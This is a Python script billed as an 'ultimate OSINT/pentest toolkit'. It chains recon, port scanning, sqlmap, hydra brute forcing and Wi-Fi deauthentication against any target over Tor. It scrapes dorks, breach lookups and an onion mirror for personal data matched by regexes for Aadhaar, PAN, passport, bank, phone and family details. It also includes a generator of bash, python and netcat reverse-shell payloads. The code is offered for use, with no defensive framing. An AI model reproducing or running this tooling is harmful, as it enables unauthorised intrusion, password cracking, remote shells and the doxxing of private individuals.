import os, subprocess, sys, requests, re, time, random, json
from colorama import Fore, init, Back
from threading import Thread, Lock
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import argparse

init(autoreset=True)
print_lock = Lock()

# --- ULTRA EXTENDED TARGET IDENTITY FILTERS ---
SURE_HITS = {
    "PAN": r"[A-Z]{5}[0-9]{4}[A-Z]{1}",
    "Aadhaar": r"\b\d{4}\s\d{4}\s\d{4}\b|\b\d{12}\b",
    "Passport": r"[A-Z][0-9]{7}",
    "Bank_Acc": r"\b[0-9]{9,18}\b",
    "VoterID": r"[A-Z]{3}[0-9]{7}",
    "Phone": r"(?:\+91|0)?[6-9]\d{9}",
    "Pincode": r"\b\d{6}\b",
    "Vehicle": r"[A-Z]{2}[0-9]{2}[A-Z]{1,2}[0-9]{4}",
    "IP_Address": r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
    "BTC_Address": r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b",
    "ETH_Address": r"0x[a-fA-F0-9]{40}",
    "Email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
    "Address": r"(?i)(Gali\s?No|H\.No|Plot|Sector|Ward|Tehsil|District|PIN:)",
    "Relations": r"(?i)(Father|Mother|W/O|S/O|D/O|Relative|Nominee)",
    "Location": r"(?i)(Village|City|State|Country|Lat|Long)"
}

# --- ALL-IN-ONE TOOLBOX (50+ TOOLS) ---
TOOLS = {
    "recon": {
        "sublist3r": "sublist3r -d {target} -v -o subdomains.txt",
        "amass": "amass enum -d {target} -o amass.txt",
        "dnsrecon": "dnsrecon -d {target} -D /usr/share/wordlists/dnsmap.txt",
        "dnsdumpster": "echo '[+] Manual: https://dnsdumpster.com/'",
        "theharvester": "theharvester -d {target} -b all -f harvest.html",
        "shodan": "shodan search '{target}'",
        "censys": "censys search '{target}'"
    },
    "scan": {
        "nmap_fast": "nmap -sS -T4 -p- --min-rate 10000 {target} -oN nmap_fast.xml",
        "nmap_full": "nmap -sC -sV -A -p- {target} -oA nmap_full",
        "masscan": "masscan -p1-65535 {target} --rate=10000 -oG masscan.grep",
        "nikto": "nikto -h {target} -o nikto.txt",
        "dirsearch": "dirsearch -u {target} -e * -x 403,429 --random-agent",
        "gobuster": "gobuster dir -u {target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50"
    },
    "osint": {
        "sherlock": "sherlock {target} --timeout 10",
        "maigret": "maigret {target} --timeout 10",
        "holehe": "holehe {target}",
        "email2phonenumber": "email2phonenumber {target}",
        "ghunt": "ghunt --email {target}",
        "osintgram": "osintgram {target}"
    },
    "web": {
        "sqlmap": "sqlmap -u '{target}' --batch --risk=3 --level=5",
        "nuclei": "nuclei -u {target} -o nuclei.txt",
        "whatweb": "whatweb -v {target}",
        "wpscan": "wpscan --url {target} --enumerate u,vp"
    },
    "crack": {
        "hydra_ssh": "hydra -L users.txt -P rockyou.txt {target} ssh",
        "hydra_http": "hydra -L users.txt -P rockyou.txt {target} http-post-form",
        "hashcat": "hashcat -m 0 -a 0 hashes.txt rockyou.txt"
    },
    "wifi": {
        "airodump": "airodump-ng wlan0mon",
        "aireplay": "aireplay-ng -0 10 -a {target} wlan0mon"
    }
}

# --- DYNAMIC HEADERS ---
def get_headers():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    return {"User-Agent": random.choice(agents)}

def get_onion_session():
    session = requests.Session()
    proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    session.proxies.update(proxies)
    retry_strategy = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    session.mount("http://", HTTPAdapter(max_retries=retry_strategy))
    session.mount("https://", HTTPAdapter(max_retries=retry_strategy))
    return session

# --- TOR START ---
def start_tor():
    if os.system("systemctl is-active --quiet tor") != 0:
        os.system("sudo systemctl start tor > /dev/null 2>&1")
    print(f"{Fore.GREEN}[✓] TOR ACTIVE - ONION + GHOST PROTOCOLS")

# --- CLEAN & EXTRACT ---
def clean_and_verify(raw_html, target, report_file, source_label):
    try:
        soup = BeautifulSoup(raw_html, 'html.parser')
        for junk in soup(["script", "style", "nav", "header", "footer"]):
            junk.decompose()
        text = soup.get_text(separator=' ')
        lines = [line.strip() for line in text.split('\n') if len(line.strip()) > 15]
        
        for line in lines:
            id_found = any(re.search(pattern, line) for pattern in SURE_HITS.values())
            if (target.lower() in line.lower() or id_found):
                clean_line = " ".join(line.split())[:300]
                with print_lock:
                    print(f"{Fore.RED}[{source_label}-HIT] {Fore.WHITE}{clean_line}")
                with open(report_file, "a", encoding='utf-8') as f:
                    f.write(f"[{source_label}] {clean_line}\n")
    except: pass

# --- ALL YOUR ORIGINAL FUNCTIONS (ENHANCED) ---
def check_breach_databases(target, report_file):
    urls = [
        f"https://haveibeenpwned.com/api/v3/breachedaccount/{target}",
        f"https://www.google.com/search?q=%22{target}%22+site:leak-lookup.com"
    ]
    for url in urls:
        try:
            res = requests.get(url, timeout=15, headers=get_headers())
            clean_and_verify(res.text, target, report_file, "BREACH-DB")
        except: pass

def http_protocol_finder(target, report_file):
    dorks = [f"https://www.google.com/search?q=inurl:http:// %22{target}%22"]
    for url in dorks:
        try:
            res = requests.get(url, timeout=15, headers=get_headers())
            clean_and_verify(res.text, target, report_file, "HTTP-DORK")
        except: pass

def advanced_onion_scanner(target, report_file):
    session = get_onion_session()
    onion_sites = [
        f"http://facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd.onion/search?q={target}"
    ]
    for url in onion_sites:
        try:
            res = session.get(url, timeout=25)
            clean_and_verify(res.text, target, report_file, "ONION-DARK")
        except: pass

# --- SUPER TOOL RUNNER (50+ TOOLS) ---
def run_tool_suite(target, report_file, category="all"):
    print(f"{Fore.CYAN}[*] Running {category.upper()} Suite - 50+ Tools...{Fore.RESET}")
    
    active_threads = []
    
    for cat_name, tools in TOOLS.items():
        if category != "all" and cat_name != category:
            continue
            
        for tool_name, cmd_template in tools.items():
            cmd = cmd_template.format(target=target)
            
            def execute_tool(cmd=cmd, name=tool_name, cat=cat_name):
                try:
                    if subprocess.run(f"command -v {cmd.split()[0]}", shell=True, capture_output=True).returncode != 0:
                        return
                    
                    process = subprocess.Popen(
                        f"timeout 120 torsocks {cmd}", shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
                    )
                    
                    for line in process.stdout:
                        clean = line.strip()
                        if any(keyword in clean.lower() for keyword in ["found", "open", "hit", "vulnerable", target.lower()]):
                            with print_lock:
                                print(f"{Fore.GREEN}[{cat.upper()}/{name.upper()}] {Fore.WHITE}{clean}")
                            with open(report_file, "a") as f:
                                f.write(f"[{cat}/{name}] {clean}\n")
                except: pass
            
            t = Thread(target=execute_tool)
            t.start()
            active_threads.append(t)
            time.sleep(0.5)  # Rate limiting
    
    for t in active_threads:
        t.join(timeout=180)

# --- WEB VULN SCANNER ---
def web_exploit_suite(target, report_file):
    print(f"{Fore.YELLOW}[*] Web Exploitation Suite...{Fore.RESET}")
    
    web_tools = [
        f"nikto -h {target}",
        f"dirsearch -u {target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        f"gobuster dir -u {target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        f"whatweb -v {target}"
    ]
    
    threads = []
    for cmd in web_tools:
        t = Thread(target=silent_tool_runner, args=(cmd, "WEB-EXPLOIT", report_file))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

# --- PAYLOAD GENERATOR ---
def generate_payloads(target_ip="YOUR_IP", lport=4444):
    payloads = {
        "bash_rev": f"bash -i >& /dev/tcp/{target_ip}/{lport} 0>&1",
        "python_rev": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target_ip}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "nc_rev": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {target_ip} {lport} >/tmp/f"
    }
    
    print(f"{Fore.MAGENTA}=== PAYLOAD GENERATOR ==={Fore.RESET}")
    for name, payload in payloads.items():
        print(f"{Fore.GREEN}[{name.upper()}] {Fore.WHITE}{payload}")

# --- ULTIMATE MAIN FUNCTION ---
def main():
    parser = argparse.ArgumentParser(description="🚀 ULTIMATE OSINT/PENTEST TOOLKIT v3.0")
    parser.add_argument("target", nargs="?", help="Target (Name/Email/Phone/IP)")
    parser.add_argument("--mode", choices=["recon", "scan", "osint", "web", "crack", "all"], default="all")
    parser.add_argument("--payload", action="store_true", help="Generate payloads")
    args = parser.parse_args()
    
    if not args.target and not args.payload:
        args.target = input(f"{Fore.WHITE}❯❯ Target: ").strip()
    
    os.makedirs('reports', exist_ok=True)
    start_tor()
    os.system('clear')
    
    print(f"{Fore.CYAN}{'═'*70}")
    print(f"{Fore.RED}    🕵️‍♂️ KHALID HUSAIN ULTIMATE INVESTIGATOR v3.0 - 50+ TOOLS{Fore.RESET}")
    print(f"{Fore.CYAN}{'═'*70}")
    
    if args.payload:
        generate_payloads()
        return
    
    target = args.target
    report_path = f"reports/{target}_{args.mode}_{int(time.time())}.txt"
    
    print(f"{Fore.BLUE}[*] MODE: {args.mode.upper()} | Target: {target}{Fore.RESET}")
    print(f"{Fore.BLUE}[*] Report: {report_path}{Fore.RESET}\n")
    
    # RUN ALL SUITES
    threads = [
        Thread(target=check_breach_databases, args=(target, report_path)),
        Thread(target=http_protocol_finder, args=(target, report_path)),
        Thread(target=advanced_onion_scanner, args=(target, report_path))
    ]
    
    # MAIN TOOL SUITE
    Thread(target=run_tool_suite, args=(target, report_path, args.mode)).start()
    
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"\n{Fore.GREEN}🎉 SCAN COMPLETE! Report: {report_path}{Fore.RESET}")
    print(f"{Fore.YELLOW}📊 Check: subdomains.txt, nmap_*.xml, nikto.txt, etc.{Fore.RESET}")

# --- SILENT TOOL HELPER ---
def silent_tool_runner(cmd, name, report_file):
    try:
        process = subprocess.Popen(f"timeout 120 torsocks {cmd}", shell=True,
                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            clean = line.strip()
            if len(clean) > 10 and any(kw in clean.lower() for kw in ["found", "open", "hit"]):
                with print_lock:
                    print(f"{Fore.GREEN}[{name}] {Fore.WHITE}{clean}")
                with open(report_file, "a") as f:
                    f.write(f"[{name}] {clean}\n")
    except: pass

if __name__ == "__main__":
    main()
